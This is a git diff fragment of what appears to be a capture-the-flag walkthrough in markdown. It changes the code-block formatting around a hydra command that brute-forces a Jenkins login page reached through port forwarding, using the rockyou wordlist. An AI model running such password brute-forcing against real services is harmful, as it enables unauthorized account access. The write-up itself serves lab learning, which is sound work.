@@ -321,9 +321,9 @@ Now let's check the process 127.0.0.1:8080 on our browser since we already port 
 
 great we can see it is running a jenkins http service, trying default and common creds did not work, let's bruteforce the login page using hydra 
 
-`
+```
 hydra -l admin -P /usr/share/wordlists/rockyou.txt 127.0.0.1 -s 8080 http-post-form "/j_acegi_security_check:j_username=^USER^&j_password=^PASS^&from=%2F&Submit=Sign+in:Invalid username or password"
-`
+```
 
 ![image](https://user-images.githubusercontent.com/87468669/194796763-b368fc50-3085-4b4c-bcfd-4431155d0dbb.png)
 
